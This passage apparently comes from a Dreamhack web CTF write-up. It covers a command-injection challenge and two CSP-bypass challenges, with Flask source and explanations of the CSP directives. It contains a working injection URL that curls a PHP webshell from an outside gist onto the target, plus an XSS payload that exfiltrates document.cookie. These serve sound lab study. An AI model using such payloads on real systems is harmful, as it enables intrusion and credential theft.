<li>A backslash () is inserted before the following characters: &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A and \xFF. ‘ and “ are escaped only when unmatched. On Windows platforms, all these characters, as well as the % and ! characters, are replaced by spaces.</li>
<li>Spaces are not escaped</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Replace single <span class="title function_ invoke__">quotes</span> (<span class="string">&#x27;) in the command string with a backslash and single quote combination (\&#x27;).</span></span><br><span class="line"><span class="string">Replaces double quotes (&quot;) in the command string with a backslash and double quote combination (\&quot;).</span></span><br><span class="line"><span class="string">Remove newline characters (\n) from the command string.</span></span><br><span class="line"><span class="string">Remove carriage return characters (\r) from command strings.</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//host3.dreamhack.games:22351/test.php?cmd=curl%22https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22-ohello.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_30.png" alt="Untitled"></p>
<p>cd..%26%26cd..%26%26ls</p>
<p><img src="/img/Dreamhack1_31.png" alt="Untitled"></p>
<p>Find the directory of flag, you can find that it has execution permission, just execute it directly &#x2F;flag</p>
<p><img src="/img/Dreamhack1_32.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_33.png" alt="Untitled"></p>
<hr>
<h3 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a><strong>CSP Bypass</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: CSP Bypass에서 실습하는 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.07 Dockerfile 제공</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  20531&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 20531</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:20531/">http://host3.dreamhack.games:20531/</a></strong></p>
<p>let’s see <a target="_blank" rel="noopener" href="http://app.pt/">app.p</a>y </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line">nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.add_cookie(cookie)</span><br><span class="line">        driver.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_xss</span>(<span class="params">param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://127.0.0.1:8000/vuln?param=<span class="subst">&#123;urllib.parse.quote(param)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> read_url(url, cookie)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">global</span> nonce</span><br><span class="line">    response.headers[</span><br><span class="line">        <span class="string">&quot;Content-Security-Policy&quot;</span></span><br><span class="line">    ] = <span class="string">f&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;&quot;</span></span><br><span class="line">    nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, nonce=nonce)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/vuln&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, nonce=nonce)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.form.get(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_xss(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: FLAG.strip()&#125;):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span>&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span>&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/memo&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memo</span>():</span><br><span class="line">    <span class="keyword">global</span> memo_text</span><br><span class="line">    text = request.args.get(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text, nonce=nonce)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>then we can notice a function</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">global</span> nonce</span><br><span class="line">    response.headers[</span><br><span class="line">        <span class="string">&quot;Content-Security-Policy&quot;</span></span><br><span class="line">    ] = <span class="string">f&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-<span class="subst">&#123;nonce&#125;</span>&#x27;&quot;</span></span><br><span class="line">    nonce = os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<ul>
<li><code>default-src &#39;self&#39;</code>: This directive sets the default source for all resources to the same origin (the page itself). This means that resources like scripts, images, and stylesheets will <strong>only be loaded from the same domain as the web page.</strong></li>
<li><code>img-src https://dreamhack.io</code>: This directive restricts image loading to the specified domain, <code>https://dreamhack.io</code>. This means that images can only be loaded from this trusted source.</li>
<li><code>style-src &#39;self&#39; &#39;unsafe-inline&#39;</code>: This directive allows stylesheets to be loaded from the same origin (the page itself) and also permits the use of inline styles (<code>unsafe-inline</code>). Inline styles are defined directly within the HTML code, which can be a security risk if not carefully managed.<ul>
<li><strong>Why is <code>unsafe-inline</code> Considered Risky?</strong><ul>
<li>Allowing inline scripts and styles through <code>unsafe-inline</code> can make a web page more vulnerable to Cross-Site Scripting (XSS) attacks.</li>
<li>XSS occurs when an attacker can inject malicious JavaScript code into a web page, allowing them to manipulate the page’s behavior, steal user data, or redirect users to malicious sites.</li>
</ul>
</li>
</ul>
</li>
<li><code>script-src &#39;self&#39; &#39;nonce-&#123;nonce&#125;&#39;</code>: This directive restricts script loading to the same origin and also <strong>allows inline scripts using a nonce</strong>. A nonce is a unique <strong>random value generated</strong> for each page load. The <code>&#123;nonce&#125;</code> placeholder will be replaced with the actual nonce value during runtime.</li>
</ul>
<p>So this CSP strategy can allow attacker in the same domain to loading the script</p>
<p>we can use &#x2F;vuln page to bypass the CSP then exec script</p>
<p>payload: </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;vuln?param=location.href=&#x27;memo?memo=&#x27;%2bdocument.cookie&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_34.png" alt="Untitled"></p>
<p>But some people may have questions, why use <code>%2b</code> instead of <code>+</code></p>
<ol>
<li><p><strong>Client-side URL Decoding:</strong></p>
<p> When a web browser receives a URL, it performs URL decoding, which involves converting certain encoded characters back to their original forms. For instance, the plus sign (<code>+</code>) is encoded as <code>%2b</code>. During URL decoding, the browser replaces <code>%2b</code> with a space ().</p>
</li>
<li><p><strong><code>src</code> Attribute and URL Decoding:</strong></p>
<p> The <code>src</code> attribute in HTML is commonly used to specify the source of resources like images, scripts, or CSS files. When the browser encounters a <code>src</code> attribute, it retrieves the specified resource. However, before making the request, it performs URL decoding on the value of the <code>src</code> attribute.</p>
</li>
<li><p><strong>Issue with Plus Sign Decoding:</strong></p>
<p> If the <code>src</code> attribute value contains a plus sign (<code>+</code>), the browser’s URL decoding process will convert it into a space (). This can cause problems if the plus sign is intended to be part of the actual resource URL.</p>
</li>
<li><p><strong>URL Encoding to Preserve Plus Sign:</strong></p>
<p> To prevent the browser from decoding the plus sign into a space, URL encoding is applied. URL encoding involves converting certain characters into their corresponding encoded forms. In this case, the plus sign (<code>+</code>) is encoded as <code>%2b</code>.</p>
</li>
<li><p><strong>Preserving Plus Sign during Transmission:</strong></p>
<p> When the URL-encoded value is sent to the server, the plus sign is preserved as <code>%2b</code>. The server, upon receiving the request, performs URL decoding, which correctly converts <code>%2b</code> back to the plus sign (<code>+</code>).</p>
</li>
</ol>
<p><strong>Example:</strong></p>
<p>Consider a URL like <code>https://example.com/image.jpg?param1=value1+param2=value2</code>.</p>
<ul>
<li><p>If this URL is directly used as the <code>src</code> attribute value without URL encoding, the browser’s URL decoding will convert the plus sign (<code>+</code>) into a space (), resulting in the following request:</p>
<p>  <code>GET https://example.com/image.jpg?param1=value1 param2=value2</code></p>
</li>
<li><p>To preserve the plus sign, URL encoding is applied:</p>
<p>  <code>https://example.com/image.jpg?param1=value1%2Bparam2=value2</code></p>
</li>
<li><p>When the URL-encoded value is sent and decoded by the server, the plus sign (<code>+</code>) is correctly preserved.</p>
</li>
</ul>
<p>In short, if you want to keep the <code>+</code> , you need to url encode it</p>
<hr>
<h3 id="CSP-Bypass-Advanced"><a href="#CSP-Bypass-Advanced" class="headerlink" title="CSP Bypass Advanced"></a><strong>CSP Bypass Advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: CSP Bypass의 패치된 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.07 Dockerfile 제공</strong></p>
<p>let’s see the <a target="_blank" rel="noopener" href="http://app.py/">app.py</a> </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/python3</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.<span class="property">webdriver</span>.<span class="property">chrome</span>.<span class="property">service</span> <span class="keyword">import</span> <span class="title class_">Service</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">secret_key</span> = os.<span class="title function_">urandom</span>(<span class="number">32</span>)</span><br><span class="line">nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="attr">try</span>:</span><br><span class="line">    <span class="variable constant_">FLAG</span> = <span class="title function_">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).<span class="title function_">read</span>()</span><br><span class="line"><span class="attr">except</span>:</span><br><span class="line">    <span class="variable constant_">FLAG</span> = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">read_url</span>(url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;):</span><br><span class="line">    cookie.<span class="title function_">update</span>(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="attr">try</span>:</span><br><span class="line">        service = <span class="title class_">Service</span>(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.<span class="title class_">ChromeOptions</span>()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.<span class="title function_">add_argument</span>(_)</span><br><span class="line">        driver = webdriver.<span class="title class_">Chrome</span>(service=service, options=options)</span><br><span class="line">        driver.<span class="title function_">implicitly_wait</span>(<span class="number">3</span>)</span><br><span class="line">        driver.<span class="title function_">set_page_load_timeout</span>(<span class="number">3</span>)</span><br><span class="line">        driver.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.<span class="title function_">add_cookie</span>(cookie)</span><br><span class="line">        driver.<span class="title function_">get</span>(url)</span><br><span class="line">    except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">        driver.<span class="title function_">quit</span>()</span><br><span class="line">        # <span class="keyword">return</span> <span class="title function_">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line">    driver.<span class="title function_">quit</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_xss</span>(param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;):</span><br><span class="line">    url = f<span class="string">&quot;http://127.0.0.1:8000/vuln?param=&#123;urllib.parse.quote(param)&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">read_url</span>(url, cookie)</span><br><span class="line"></span><br><span class="line">@app.<span class="property">after_request</span></span><br><span class="line">def <span class="title function_">add_header</span>(response):</span><br><span class="line">    <span class="variable language_">global</span> nonce</span><br><span class="line">    response.<span class="property">headers</span>[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = f<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; object-src &#x27;none&#x27;&quot;</span></span><br><span class="line">    nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>, nonce=nonce)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/vuln&quot;</span>)</span><br><span class="line">def <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;vuln.html&quot;</span>, param=param, nonce=nonce)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;flag.html&quot;</span>, nonce=nonce)</span><br><span class="line">    elif request.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_xss</span>(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="variable constant_">FLAG</span>.<span class="title function_">strip</span>()&#125;):</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&#x27;&lt;script nonce=&#123;nonce&#125;&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f<span class="string">&#x27;&lt;script nonce=&#123;nonce&#125;&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/memo&quot;</span>)</span><br><span class="line">def <span class="title function_">memo</span>():</span><br><span class="line">    <span class="variable language_">global</span> memo_text</span><br><span class="line">    text = request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text, nonce=nonce)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>notice here</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">add_header</span>(response):</span><br><span class="line">    <span class="variable language_">global</span> nonce</span><br><span class="line">    **response.<span class="property">headers</span>[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = f<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://dreamhack.io; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; object-src &#x27;none&#x27;&quot;</span>**</span><br><span class="line">    nonce = os.<span class="title function_">urandom</span>(<span class="number">16</span>).<span class="title function_">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<ul>
<li><code>default-src &#39;self&#39;</code>: This restricts resources like scripts, images, and stylesheets to load from the same origin (the page itself) by default.</li>
<li><code>img-src https://dreamhack.io</code>: This allows images to be loaded only from the trusted domain <code>https://dreamhack.io</code>.</li>
<li><code>style-src &#39;self&#39; &#39;unsafe-inline&#39;</code>: This permits stylesheets from the same origin and allows inline styles (<code>unsafe-inline</code>), which is generally considered less secure.</li>
<li><code>script-src &#39;self&#39; &#39;nonce-&#123;nonce&#125;&#39;</code>: This directive allows scripts to load from the same origin (<code>&#39;self&#39;</code>) and also enables inline scripts by using a nonce. The placeholder <code>&#123;nonce&#125;</code> will be replaced with an actual nonce value during runtime.</li>
<li><code>object-src &#39;none&#39;</code>: This disallows loading of any objects (e.g., Flash, ActiveX) for enhanced security.</li>
</ul>
<p>The <code>script-src</code> directive here contains the value of <code>&#39;nonce-&#123;nonce&#125;&#39;</code>, where <code>&#123;nonce&#125;</code> will be replaced with the actual nonce value. This means that only scripts with the correct nonce value will be allowed to execute</p>
<p>Let us notice the <code>base.html</code> in the web page</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/bootstrap.min.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/bootstrap-theme.min.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;css/non-responsive.css&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; CSP-Bypass-Advanced<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    &#123;% block head %&#125;&#123;% endblock %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Fixed navbar --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-default navbar-fixed-top&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>CSP-Bypass-Advanced<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;navbar&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--/.nav-collapse --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">      &#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- /container --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;js/jquery.min.js&#x27;)&#125;&#125;&quot;</span> <span class="attr">nonce</span>=<span class="string">&#123;&#123;</span> <span class="attr">nonce</span> &#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;js/bootstrap.min.js&#x27;) &#125;&#125;&quot;</span> <span class="attr">nonce</span>=<span class="string">&#123;&#123;</span> <span class="attr">nonce</span> &#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_35.png" alt="Untitled"></p>
<p><strong>base.html:</strong></p>
<ul>
<li>This file serves as a base template for other HTML templates in the application.</li>
<li>It defines the overall layout of the web pages, including the header, navigation bar, container for content, and footer.</li>
<li>Importantly, it <strong>includes the JavaScript files (<code>jquery.min.js</code> and <code>bootstrap.min.js</code>)</strong> using the <code>url_for</code> function to construct the correct URLs for static files.</li>
<li>The <code>nonce</code> value generated in <code>app.py</code> is injected into the <code>nonce</code> attribute of the script tags using <code>Jinja</code> templating syntax (<code>&#123;&#123; nonce &#125;&#125;</code>).<ul>
<li>Jinja is a template engine provided by Flask. When used with render_template, you can easily dynamically write tags or information into HTML.</li>
</ul>
</li>
</ul>
<p><strong>app.py:</strong></p>
<ul>
